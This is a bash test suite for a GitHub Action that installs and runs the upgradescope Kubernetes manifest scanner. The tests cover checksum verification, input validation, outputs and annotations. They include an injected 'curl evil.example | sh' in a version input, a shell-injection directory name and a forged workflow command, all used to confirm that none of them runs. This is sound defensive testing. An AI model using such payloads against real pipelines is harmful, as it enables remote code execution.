#!/usr/bin/env bash
# Tests for the GitHub Action (make action-test; CI's action job). Offline:
# curl and go are stubs, releases are local files, and the scan cases run a
# binary built from this tree. Covers:
#   - both action.yml files: no ${{ }} expression inside a run: script, and
#     the same action apart from where run.sh lives;
#   - ci.yml: a change to any file the action job tests triggers that job;
#   - action/run.sh install: input validation, sha256 verification against
#     the release's checksums.txt (fail closed), the go install fallback
#     only with a Go toolchain, and version: preinstalled;
#   - action/run.sh scan: exit codes, outputs, annotations and the step
#     summary on action/testdata, and an injection payload as data.
set -euo pipefail
cd "$(dirname "$0")/.."

work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT
: >"$work/results"
ok() { echo "ok   $1" | tee -a "$work/results"; }
fail() {
  echo "FAIL $1" >&2
  [ -z "${2:-}" ] || sed 's/^/     /' "$2" >&2
  echo "FAIL $1" >>"$work/results"
}

# --- the action.yml files -------------------------------------------------

# Lines of a run: script (the run: line and its block) holding ${{.
for yml in action.yml action/action.yml; do
  bad=$(awk '
    /^ *(- )?run:/ { match($0, /^ */); ind = RLENGTH; inrun = 1; if (index($0, "${{")) print FNR ": " $0; next }
    inrun { match($0, /^ */); if ($0 !~ /^ *$/ && RLENGTH <= ind) inrun = 0 }
    inrun && index($0, "${{") { print FNR ": " $0 }
  ' "$yml")
  if [ -z "$bad" ] && grep -q 'run:' "$yml"; then
    ok "$yml: no \${{ }} expression in a run: script"
  else
    echo "$bad" >"$work/out"
    fail "$yml: \${{ }} expression in a run: script (pass it through env:)" "$work/out"
  fi
done
if diff <(sed 's#\$GITHUB_ACTION_PATH/action/run\.sh#$GITHUB_ACTION_PATH/run.sh#' action.yml) action/action.yml >"$work/out"; then
  ok "action.yml and action/action.yml are the same action"
else
  fail "action.yml and action/action.yml differ beyond the run.sh path" "$work/out"
fi
# On PRs and pushes, CI's action job runs only when the changes job's
# action filter matches; each file the job tests must be in it. The release
# filter gates release-check (GoReleaser snapshot and multi-arch images, up
# to 30 minutes), which tests none of the scan or report code, so the
# action's files stay out of it.
ci=.github/workflows/ci.yml
filter() { awk -v name="$1" '$0 ~ "^ *" name ":$" { on = 1; next } on && !/^ *(- |#)/ { on = 0 } on' "$ci"; }
job() { awk -v name="$1" '$0 == "  " name ":" { on = 1; next } on && /^  [^ ]/ { on = 0 } on' "$ci"; }
action_filter=$(filter action) release_filter=$(filter release)
for f in action.yml 'action/**' hack/action_test.sh 'internal/cli/**' 'internal/sarif/**' 'internal/suppress/**' "$ci" Makefile; do
  if grep -qxF "              - '$f'" <<<"$action_filter"; then
    ok "ci.yml's action filter runs the action job on $f"
  else
    echo "add '$f' to the changes job's action filter in $ci" >"$work/out"
    fail "ci.yml's action filter runs the action job on $f" "$work/out"
  fi
done
if job changes | grep -qE '^      action: \$\{\{ steps\.[a-z]+\.outputs\.action \}\}$' &&
  job action | grep -qF "needs.changes.outputs.action == 'true'"; then
  ok "the action job runs on the changes job's action output"
else
  job action >"$work/out"
  fail "the action job runs on the changes job's action output" "$work/out"
fi
if [ -n "$release_filter" ] && ! grep -E "internal/|'action\.yml'|'action/\*\*'|action_test" <<<"$release_filter" >"$work/out"; then
  ok "ci.yml's release filter leaves the action's files to the action filter"
else
  fail "ci.yml's release filter leaves the action's files to the action filter" "$work/out"
fi

# --- stubs ----------------------------------------------------------------

# A sandbox PATH with the tools run.sh uses and no go; stub dirs are put in
# front of it per case.
mkdir -p "$work/sys"
for t in bash sh env cat chmod cp mkdir mktemp rm tar gzip awk sed grep head tr uname jq sha256sum shasum perl; do
  p=$(command -v "$t" || true)
  [ -z "$p" ] || ln -s "$p" "$work/sys/$t"
done

releases=https://github.com/abd-ulbasit/upgradescope/releases
os=$(uname -s | tr '[:upper:]' '[:lower:]')
case "$(uname -m)" in x86_64 | amd64) arch=amd64 ;; *) arch=arm64 ;; esac
asset="upgradescope_${os}_${arch}.tar.gz"

# curl: serves $releases/download/<tag>/<file> from $work/rel/<tag>/<file>
# and redirects $releases/latest to $STUB_LATEST; logs every URL.
mkdir -p "$work/stub-curl"
cat >"$work/stub-curl/curl" <<EOF
#!/usr/bin/env bash
out= fmt= url=
while [ \$# -gt 0 ]; do
  case \$1 in -o) out=\$2; shift ;; -w) fmt=\$2; shift ;; -*) ;; *) url=\$1 ;; esac
  shift
done
echo "curl \$url" >>"$work/calls"
case \$url in
  "$releases/latest")
    [ -n "\${STUB_LATEST:-}" ] || exit 22
    [ "\$fmt" != '%{url_effective}' ] || printf '%s' "$releases/tag/\$STUB_LATEST" ;;
  "$releases/download/"*)
    f="$work/rel/\${url#"$releases/download/"}"
    [ -f "\$f" ] || exit 22
    cp "\$f" "\$out" ;;
  *) exit 6 ;;
esac
EOF
# go: "builds" a stub upgradescope into $work/gobin.
mkdir -p "$work/stub-go"
cat >"$work/stub-go/go" <<EOF
#!/usr/bin/env bash
echo "go \$*" >>"$work/calls"
case "\$1 \${2:-}" in
  "env GOBIN") echo "$work/gobin" ;;
  install*) mkdir -p "$work/gobin" && printf '#!/bin/sh\necho built from source\n' >"$work/gobin/upgradescope" && chmod +x "$work/gobin/upgradescope" ;;
esac
EOF
chmod +x "$work/stub-curl/curl" "$work/stub-go/go"

# release <tag> <checksums-mode: ok|bad|missing|none> [no-archive]
release() {
  local d="$work/rel/$1"
  mkdir -p "$d" "$work/pkg"
  printf '#!/bin/sh\necho "upgradescope version %s"\n' "$1" >"$work/pkg/upgradescope"
  chmod +x "$work/pkg/upgradescope"
  [ "${3:-}" = no-archive ] || tar -czf "$d/$asset" -C "$work/pkg" upgradescope
  case $2 in
    ok) (cd "$d" && { sha256sum "$asset" 2>/dev/null || shasum -a 256 "$asset"; }) >"$d/checksums.txt" ;;
    bad) echo "0000000000000000000000000000000000000000000000000000000000000000  $asset" >"$d/checksums.txt" ;;
    missing) echo "0000000000000000000000000000000000000000000000000000000000000000  upgradescope_plan9_amd64.tar.gz" >"$d/checksums.txt" ;;
    none) ;;
  esac
}
release v9.9.9 ok
release v9.9.8 bad
release v9.9.7 missing
release v9.9.6 none no-archive
release v9.9.5 none

# The real binary, for the scan cases.
mkdir -p "$work/real"
go build -o "$work/real/upgradescope" ./cmd/upgradescope

# run <cmd> <path-prefix> [env...]: action/run.sh <cmd> as a step of a fresh
# job; output in $work/out, the step's runner files in $rt, RUNNER_TEMP in
# $tmp. With same_job=1, a later step of the last run's job: its own runner
# files, the same RUNNER_TEMP.
run() {
  local cmd=$1 prefix=$2
  shift 2
  rt="$work/rt$((++n))"
  [ -n "${same_job:-}" ] || tmp="$rt/tmp"
  mkdir -p "$rt" "$tmp"
  : >"$rt/output" && : >"$rt/path" && : >"$rt/summary" && : >"$work/calls"
  code=0
  env -i HOME="$HOME" PATH="$prefix$work/sys" RUNNER_TEMP="$tmp" \
    GITHUB_OUTPUT="$rt/output" GITHUB_PATH="$rt/path" GITHUB_STEP_SUMMARY="$rt/summary" \
    INPUT_PATH=action/testdata/removed INPUT_TARGET=1.36 INPUT_FAIL_ON=blocker INPUT_VERSION=v9.9.9 \
    "$@" bash action/run.sh "$cmd" >"$work/out" 2>&1 || code=$?
}
n=0
# expect <name> <want-exit> <want-substring>: checks the last run.
expect() {
  if [ "$code" = "$2" ] && grep -qF -- "$3" "$work/out"; then ok "$1"; else
    echo "(exit $code, want $2 and '$3')" >>"$work/out"
    fail "$1" "$work/out"
  fi
}
# output <name>: the last run's step output <name>.
output() { sed -n "s/^$1=//p" "$rt/output" | tail -n 1; }
# has <name> <file> <substring>
has() { if grep -qF -- "$3" "$2"; then ok "$1"; else fail "$1" "$2"; fi; }
hasnt() { if grep -qF -- "$3" "$2"; then fail "$1" "$2"; else ok "$1"; fi; }

# --- input validation -----------------------------------------------------

run install "$work/stub-curl:" INPUT_VERSION='v1.0; curl evil.example | sh'
expect "invalid version is rejected" 1 "invalid version 'v1.0; curl evil.example | sh'"
hasnt "invalid version downloads nothing" "$work/calls" curl
run install "$work/stub-curl:" INPUT_FAIL_ON=error
expect "invalid fail-on is rejected" 1 "invalid fail-on 'error' (want blocker, warning or never)"
run install "$work/stub-curl:" INPUT_TARGET=latest
expect "invalid target is rejected" 1 "invalid target 'latest'"
run install "$work/stub-curl:" INPUT_PATH=does/not/exist
expect "missing path is rejected" 1 "path 'does/not/exist' does not exist"
run install "$work/stub-curl:" INPUT_PATH=
expect "empty path is rejected" 1 "path is required"

# --- install ----------------------------------------------------------------

run install "$work/stub-curl:"
expect "release install verifies the checksum" 0 "sha256 OK: $asset"
has "release install puts the binary on GITHUB_PATH" "$rt/path" "$tmp/upgradescope-bin"
[ -x "$tmp/upgradescope-bin/upgradescope" ] && ok "release install extracts the binary" ||
  fail "release install extracts the binary" "$work/out"

run install "$work/stub-curl:" INPUT_VERSION=latest STUB_LATEST=v9.9.9
expect "latest resolves to the newest release tag" 0 "latest release is v9.9.9"
has "latest downloads the resolved tag" "$work/calls" "$releases/download/v9.9.9/checksums.txt"

run install "$work/stub-curl:$work/stub-go:" INPUT_VERSION=v9.9.8
expect "checksum mismatch fails closed" 1 "sha256 mismatch for $asset"
[ ! -e "$tmp/upgradescope-bin/upgradescope" ] && [ ! -s "$rt/path" ] && ok "checksum mismatch installs nothing" ||
  fail "checksum mismatch installs nothing" "$work/out"
hasnt "checksum mismatch does not fall back to go install" "$work/calls" "go install"

run install "$work/stub-curl:" INPUT_VERSION=v9.9.7
expect "an archive missing from checksums.txt fails" 1 "checksums.txt for v9.9.7 has no entry for $asset"
run install "$work/stub-curl:" INPUT_VERSION=v9.9.5
expect "a release without checksums.txt fails" 1 "cannot download checksums.txt for v9.9.5"

run install "$work/stub-curl:" INPUT_VERSION=v9.9.6
expect "no archive and no Go toolchain fails clearly" 1 "no Go toolchain to build it from source"
run install "$work/stub-curl:$work/stub-go:" INPUT_VERSION=v9.9.6
expect "no archive falls back to go install with Go present" 0 "falling back to go install"
has "go install builds the requested version" "$work/calls" "go install github.com/abd-ulbasit/upgradescope/cmd/upgradescope@v9.9.6"
has "go install puts GOBIN on GITHUB_PATH" "$rt/path" "$work/gobin"
run install "$work/stub-curl:$work/stub-go:" INPUT_VERSION=latest
expect "unresolvable latest falls back to go install" 0 "falling back to go install"
has "go install builds @latest" "$work/calls" "cmd/upgradescope@latest"

run install "$work/real:$work/stub-curl:" INPUT_VERSION=preinstalled
expect "preinstalled uses the binary on PATH" 0 "using $work/real/upgradescope"
hasnt "preinstalled downloads nothing" "$work/calls" curl
run install "$work/stub-curl:" INPUT_VERSION=preinstalled
expect "preinstalled without a binary fails" 1 "no upgradescope on PATH"

# --- scan -------------------------------------------------------------------

run scan "$work/real:"
expect "removed APIs fail the gate with exit 2" 2 "readiness gate failed"
sarif=$(output sarif-file) report=$(output report-json)
case $sarif in "$tmp"/*.sarif) ok "sarif-file output is under RUNNER_TEMP" ;; *) fail "sarif-file output is under RUNNER_TEMP" "$rt/output" ;; esac
jq -e '.runs[0].results | length == 2' "$sarif" >/dev/null &&
  ok "SARIF is complete when the gate fails" || fail "SARIF is complete when the gate fails" "$rt/output"
jq -e '.findings | length == 2' "$report" >/dev/null &&
  ok "report-json output is the JSON report" || fail "report-json output is the JSON report" "$rt/output"
for kv in verdict=blocked score=50 ready=false blockers=2 warnings=0; do
  has "output $kv" "$rt/output" "$kv"
done
has "summary has the findings table" "$rt/summary" "| blocker | networking.k8s.io/v1beta1 Ingress removed in 1.22 (1 object) | \`action/testdata/removed/all.yaml:2\` shop/web | migrate to networking.k8s.io/v1 Ingress |"
has "summary header" "$rt/summary" "### upgradescope: blocked"
has "log lists every blocker with its fix" "$work/out" "batch/v1beta1 CronJob removed in 1.25 (1 object) | \`action/testdata/removed/all.yaml:12\` nightly | migrate to batch/v1 CronJob"
has "blocker annotation with file and line" "$work/out" "::error file=action/testdata/removed/all.yaml,line=2,title=upgradescope blocker (removed-api)::networking.k8s.io/v1beta1 Ingress removed in 1.22 (1 object). Fix: migrate to networking.k8s.io/v1 Ingress"

run scan "$work/real:" INPUT_PATH=action/testdata/clean
expect "clean manifests pass the gate" 0 "### upgradescope: ready"
for kv in verdict=ready score=100 ready=true blockers=0 warnings=0; do has "clean output $kv" "$rt/output" "$kv"; done
has "clean summary is written" "$rt/summary" "No findings."

# Two uses of the action in one job (CI's action job: removed, then clean,
# then checks on removed's files) share RUNNER_TEMP; the second must not
# overwrite the first one's reports.
run scan "$work/real:"
sarif=$(output sarif-file) report=$(output report-json)
same_job=1 run scan "$work/real:" INPUT_PATH=action/testdata/clean
expect "a second scan in the same job runs" 0 "### upgradescope: ready"
[ "$(output sarif-file)" != "$sarif" ] && [ "$(output report-json)" != "$report" ] &&
  ok "each scan in a job writes its own report files" || fail "each scan in a job writes its own report files" "$rt/output"
jq -e '.runs[0].results | length == 2' "$sarif" >/dev/null &&
  ok "a later scan in the job leaves the first sarif-file intact" || fail "a later scan in the job leaves the first sarif-file intact" "$sarif"
jq -e '.findings | length == 2' "$report" >/dev/null &&
  ok "a later scan in the job leaves the first report-json intact" || fail "a later scan in the job leaves the first report-json intact" "$report"

run scan "$work/real:" INPUT_FAIL_ON=never
expect "fail-on never passes with blockers" 0 "### upgradescope: blocked"
# ::error marks the findings that fail the gate; with fail-on never, none.
has "fail-on never annotates a blocker as a warning" "$work/out" "::warning file=action/testdata/removed/all.yaml,line=2,title=upgradescope blocker (removed-api)::"
if grep -q '^::error' "$work/out"; then fail "fail-on never emits no ::error" "$work/out"; else ok "fail-on never emits no ::error"; fi

# The audit's payload, and a command substitution, as a directory name.
payload="$work/x\" ; echo INJECTED-COMMAND-RAN ; touch $work/pwned ; echo \"\$(touch $work/pwned2)"
mkdir -p "$payload" && cp action/testdata/clean/all.yaml "$payload/"
run scan "$work/real:" INPUT_PATH="$payload"
expect "an injection payload in path is scanned as a path" 0 "### upgradescope: ready"
[ ! -e "$work/pwned" ] && [ ! -e "$work/pwned2" ] && ! grep -qx INJECTED-COMMAND-RAN "$work/out" &&
  ok "the injection payload did not run" || fail "the injection payload did not run" "$work/out"

# A v0.1.x release (what version: latest resolves to until v0.2.0 ships):
# no --output markdown, and JSON in the v0.1.1 Report shape, without
# verdict, filesBase or finding objects. The gate and every output still
# work. STUB_REPORT replaces the jq filter that reshapes the JSON.
mkdir -p "$work/old"
cat >"$work/old/upgradescope" <<EOF
#!/usr/bin/env bash
case "\$*" in
  *"--output markdown"*) echo 'invalid --output "markdown" (want table, json, or sarif)' >&2; exit 1 ;;
  *"--output json"*)
    "$work/real/upgradescope" "\$@" | jq "\${STUB_REPORT:-del(.verdict, .filesBase) | .findings |= map(del(.objects))}" ;;
  *) "$work/real/upgradescope" "\$@" ;;
esac
EOF
chmod +x "$work/old/upgradescope"
run scan "$work/old:"
expect "a v0.1.x upgradescope still gates" 2 "cannot write the step summary"
for kv in verdict=blocked score=50 ready=false blockers=2 warnings=0; do
  has "a v0.1.x upgradescope sets output $kv" "$rt/output" "$kv"
done
hasnt "a v0.1.x upgradescope sets no output to null" "$rt/output" "=null"
has "a v0.1.x blocker annotation has no file" "$work/out" "::error title=upgradescope blocker (removed-api)::networking.k8s.io/v1beta1 Ingress removed in 1.22"
run scan "$work/old:" INPUT_PATH=action/testdata/clean
has "a v0.1.x clean scan sets verdict=ready" "$rt/output" "verdict=ready"
# Not ready without a blocker (v0.2's unknown) is neither ready nor blocked.
run scan "$work/old:" INPUT_PATH=action/testdata/clean STUB_REPORT='del(.verdict) | .ready = false'
has "a v0.1.x not-ready report without blockers sets verdict=unknown" "$rt/output" "verdict=unknown"
# Warning findings (the stub's JSON relabels the fixture's blockers) are
# ::error when fail-on warning makes them fail the gate, else ::warning.
run scan "$work/old:" INPUT_FAIL_ON=warning STUB_REPORT='.findings |= map(.severity = "warning")'
has "fail-on warning annotates a warning as an error" "$work/out" "::error file=action/testdata/removed/all.yaml,line=2,title=upgradescope warning (removed-api)::"
run scan "$work/old:" STUB_REPORT='.findings |= map(.severity = "warning")'
has "fail-on blocker annotates a warning as a warning" "$work/out" "::warning file=action/testdata/removed/all.yaml,line=2,title=upgradescope warning (removed-api)::"

# A failing JSON or Markdown pass: its stderr goes into one ::warning, so a
# later stderr line cannot be read as a workflow command.
mkdir -p "$work/noisy"
cat >"$work/noisy/upgradescope" <<EOF
#!/usr/bin/env bash
case "\$*" in
  *"--output sarif"*) "$work/real/upgradescope" "\$@" ;;
  *) printf 'it broke\n::error::forged by stderr\n100%% sure\n' >&2; exit 1 ;;
esac
EOF
chmod +x "$work/noisy/upgradescope"
run scan "$work/noisy:"
expect "a failing JSON pass still gates" 2 "::warning::upgradescope --output json failed, so the outputs and annotations are not set: it broke%0A::error::forged by stderr%0A100%25 sure"
expect "a failing Markdown pass warns" 2 "cannot write the step summary (it predates --output markdown, added after v0.1.1): it broke%0A"
if grep -q '^::error::forged' "$work/out"; then fail "stderr cannot start a workflow command" "$work/out"; else ok "stderr cannot start a workflow command"; fi

mkdir -p "$work/broken"
printf '#!/bin/sh\necho "load knowledge base: boom" >&2\nexit 1\n' >"$work/broken/upgradescope"
chmod +x "$work/broken/upgradescope"
run scan "$work/broken:"
expect "a scan error is exit 1" 1 "load knowledge base: boom"
has "a scan error is in the summary" "$rt/summary" "upgradescope: scan failed (exit 1)"

pass=$(grep -c '^ok' "$work/results" || true)
fail=$(grep -c '^FAIL' "$work/results" || true)
echo "action_test: $pass passed, $fail failed"
[ "$fail" -eq 0 ] && [ "$pass" -gt 0 ]
